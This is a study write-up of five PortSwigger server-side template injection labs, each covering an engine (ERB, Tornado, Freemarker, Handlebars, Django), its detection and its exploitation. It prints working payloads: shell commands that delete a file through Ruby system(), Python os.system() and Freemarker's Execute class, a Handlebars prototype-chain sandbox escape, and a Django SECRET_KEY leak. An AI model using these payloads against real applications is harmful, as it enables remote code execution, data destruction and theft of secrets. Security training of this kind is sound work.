# Server-Side Template Injection (SSTI) — PortSwigger Labs

**Author:** OBADA
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Topic:** Server-Side Template Injection (SSTI)

---

## What is Server-Side Template Injection?

Modern web applications often use **template engines** to dynamically generate HTML pages. These engines (like Jinja2, Twig, ERB, Freemarker, etc.) allow developers to embed expressions and logic inside HTML templates. For example, a template might look like:

```
Hello, {{ user.name }}!
```

The engine evaluates `user.name` and renders the result. This is expected behavior.

**SSTI** occurs when **user-controlled input is embedded directly into a template** instead of being passed as data to it. When this happens, the attacker's input is evaluated as template code — not treated as a string.

### Why is it dangerous?

Because template engines have access to the underlying language runtime. Depending on the engine, an attacker can:

- Execute arbitrary OS commands
- Read files from the server
- Leak sensitive configuration (secret keys, credentials)
- Achieve full Remote Code Execution (RCE)

### How to identify SSTI

The standard approach is to inject a **polyglot fuzz string** that contains syntax from multiple template languages:

```
${{<%[%'"}}%\
```

If the application throws a verbose error, it often reveals the template engine name. If it evaluates part of your input, you're in.

A safer detection step is to inject a **mathematical expression** using the target engine's syntax:

| Engine      | Test Payload   | Expected Output |
|-------------|----------------|-----------------|
| Jinja2/Twig | `{{7*7}}`      | `49`            |
| ERB (Ruby)  | `<%= 7*7 %>`   | `49`            |
| Freemarker  | `${7*7}`       | `49`            |
| Tornado     | `{{7*7}}`      | `49`            |
| Handlebars  | `{{7*7}}`      | No output (sandbox) |

If the math resolves, the input is being evaluated — SSTI is confirmed.

### SSTI vs XSS

A common confusion: SSTI happens **on the server**, before the response is sent. XSS happens **in the browser**, after. SSTI is generally more critical because it gives server-side code execution.

### Methodology

```
Detect → Identify Engine → Read Docs → Find Dangerous Built-in → Exploit → RCE / Data Leak
```

---

## Labs

---

### Lab 1 — Basic SSTI (ERB / Ruby)

**Goal:** Execute OS commands via ERB template injection and delete `/home/carlos/morale.txt`.

#### Context

The application has a product page that uses a `message` GET parameter to display a string like "Unfortunately this product is out of stock". This message is rendered directly inside an ERB template without sanitization.

#### Detection

ERB (Embedded Ruby) uses `<%= expression %>` to evaluate and print an expression. Injecting a math expression:

```
<%= 7*7 %>
```

URL-encoded:

```
/?message=<%25%3d+7*7+%25>
```

The page renders `49` — SSTI confirmed.

#### Exploitation

Ruby's `system()` method executes OS commands. The payload:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

URL-encoded and delivered via the `message` parameter:

```
/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

#### Key Takeaway

> ERB evaluates `<%= %>` blocks as Ruby code. `system()` is a native Ruby method that passes the string directly to the OS shell. No extra imports needed.

---

### Lab 2 — Basic SSTI in Code Context (Tornado / Python)

**Goal:** Escape out of a Tornado template expression in code context and achieve RCE.

#### Context

This lab is different. The injection point is **inside a template expression**, not in a plain string context. The application uses a `blog-post-author-display` parameter to control how the author name is displayed. Internally, the template evaluates something like:

```python
{{ user.name }}
```

The parameter value replaces the attribute being accessed — so it's injected *inside* an already-open `{{ }}` block.

#### Detection

Submitting `user.name}}{{7*7}}` via the `blog-post-author-display` parameter (POST request to `/my-account/change-blog-post-author-display`) causes the rendered output to show:

```
Peter Wiener49}}
```

The `49` confirms that `7*7` was evaluated — we successfully escaped the expression and injected new template code.

#### Exploitation

Tornado supports statement blocks using `{% %}` syntax. Python's `os` module provides `os.system()` for command execution. The payload:

```
user.name}}{%  import os %}{{os.system('rm /home/carlos/morale.txt')
```

URL-encoded in the POST body:

```
blog-post-author-display=user.first_name}}{%25import+os+%25}{{os.system('rm+/home/carlos/morale.txt')
```

Reloading the page containing the comment triggers the template render and executes the payload.

#### Key Takeaway

> Code context injection means you are already inside `{{ }}`. You need to close it first (`}}`), inject your code, then leave the next `}}` unclosed — Tornado tolerates this. The `{% %}` block is used for statements (like imports), while `{{ }}` is for expressions.

#### Note on URL Encoding

`%25` is the URL-encoded form of `%`. This is necessary because `%` is a special character in URLs. So `{%` becomes `{%25`, not `{%` directly — otherwise the browser or proxy would interpret it incorrectly.

---

### Lab 3 — SSTI Using Documentation (Freemarker / Java)

**Goal:** Identify the template engine, research its documentation, and achieve RCE via a dangerous built-in.

#### Context

The application allows a `content-manager` user to edit product description templates directly. The injection is in a **template file**, not a URL parameter.

#### Detection

Injecting a fuzz string like `${foobar}` into the template and saving it produces a verbose error that reveals the engine: **Apache Freemarker**.

#### Research Path

The Freemarker documentation has an FAQ section titled *"Can I allow users to upload templates and what are the security implications?"* — a direct hint. It describes the `new()` built-in as dangerous because it can instantiate arbitrary Java classes.

Checking the JavaDoc for `TemplateModel` (the interface `new()` targets), there is a class called `Execute` — which runs OS commands.

#### Exploitation

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("rm /home/carlos/morale.txt") }
```

This creates an instance of the `Execute` class and calls it with the command string.

#### Key Takeaway

> Freemarker's `new()` built-in is a gateway to Java's class system. If the template sandbox is not locked down, an attacker can instantiate any class that implements `TemplateModel` — including `Execute`, which is a documented part of the Freemarker library itself.

---

### Lab 4 — SSTI in Unknown Language with Documented Exploit (Handlebars / Node.js)

**Goal:** Identify an unknown template engine and use a public exploit to achieve RCE.

#### Context

Same as Lab 1 — a `message` GET parameter renders content on the product page. The engine is not immediately obvious.

#### Detection

Injecting the polyglot fuzz string:

```
${{<%[%'"}}%\
```

Produces an error that identifies the engine as **Handlebars** (a JavaScript templating engine for Node.js).

#### Research

Handlebars has no built-in expression for executing code, and it runs inside a sandbox. However, a well-known public exploit by `@Zombiehelp54` abuses the JavaScript prototype chain to escape the sandbox and reach `Function()` — which can evaluate arbitrary JavaScript.

#### Exploitation

The technique works by:
1. Using `{{#with}}` blocks to navigate the string prototype chain
2. Accessing `String.sub.constructor` — which is the `Function` constructor
3. Pushing a `return require(...)` statement into a code list
4. Calling `.apply()` to execute it

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

This payload is URL-encoded and passed as the `message` parameter value.

#### Key Takeaway

> Handlebars sandboxes direct code execution, but the sandbox itself runs inside JavaScript — and JavaScript's prototype chain is accessible. The exploit doesn't break Handlebars; it uses Handlebars features (`lookup`, `with`, `each`) to walk the prototype chain until it reaches `Function`, then uses that to run arbitrary JS. This is a classic sandbox escape via prototype chain traversal.

---

### Lab 5 — SSTI with Information Disclosure via User-Supplied Objects (Django / Python)

**Goal:** Identify the framework through SSTI, access the `settings` object, and leak the `SECRET_KEY`.

#### Context

Same setup as Lab 3 — `content-manager` can edit product templates. The goal here is **information disclosure**, not RCE.

#### Detection

Injecting `${{<%[%'"}}%\` into the template produces a Django-specific error page.

#### Exploitation Path

Django's template language has a built-in tag called `{% debug %}` which dumps all context variables available in the current template — including what objects are passed into it.

```django
{% debug %}
```

The output reveals that a `settings` object is accessible. Django's `settings` module contains `SECRET_KEY` — a value used internally for signing sessions, CSRF tokens, and password reset links. If an attacker knows this key, they can forge any signed data.

Reading the key:

```django
{{settings.SECRET_KEY}}
```

This renders the key value directly on the page.

#### Key Takeaway

> Django's template engine is not designed for RCE — its sandbox is strong. But information disclosure is equally critical. A leaked `SECRET_KEY` allows an attacker to sign arbitrary session cookies, forge CSRF tokens, and potentially escalate to account takeover without any RCE. This lab demonstrates that SSTI impact goes beyond code execution.

---

## Summary Table

| Lab | Engine         | Language   | Injection Point         | Impact              |
|-----|----------------|------------|-------------------------|---------------------|
| 1   | ERB            | Ruby       | GET parameter           | RCE                 |
| 2   | Tornado        | Python     | POST parameter (code context) | RCE           |
| 3   | Freemarker     | Java       | Template editor         | RCE via Java class  |
| 4   | Handlebars     | JavaScript | GET parameter           | RCE via prototype chain |
| 5   | Django         | Python     | Template editor         | Secret key leak     |

---

## References

- [PortSwigger SSTI Research — James Kettle](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection)
- [ERB Ruby Docs](https://ruby-doc.org/stdlib/libdoc/erb/rdoc/ERB.html)
- [Tornado Template Docs](https://www.tornadoweb.org/en/stable/template.html)
- [Freemarker Built-in Reference](https://freemarker.apache.org/docs/ref_builtins_expert.html)
- [Django Template Language](https://docs.djangoproject.com/en/stable/ref/templates/builtins/)
- [Handlebars Sandbox Escape — @Zombiehelp54](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
